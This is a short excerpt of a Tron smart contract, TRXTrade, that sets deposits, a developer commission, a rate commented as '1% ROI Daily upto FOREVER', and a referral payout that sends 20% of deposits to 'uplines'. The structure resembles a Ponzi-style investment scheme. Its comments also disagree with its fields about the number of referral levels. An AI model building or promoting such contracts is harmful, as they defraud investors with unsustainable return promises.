...
contract TRXTrade {
    ...
    uint private minDepositSize = 100000000;    // 100 Min Deposit
    uint private interestRateDivisor = 1000000000000;
    uint public devCommission = 5;
    uint public commissionDivisor = 100;
    uint private minuteRate = 115740;      // 1% ROI Daily upto FOREVER
    ...
    struct Player {
        ...
        uint payoutSum;
        address affFrom;
        uint256 aff1sum;       //8 Level Referral Commission
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
    ...
    function distributeRef(uint256 _trx, address _affFrom) private{
        ...
        uint256 _allaff = (_trx.mul(20)).div(100);     // 20% Divides into 8 uplines
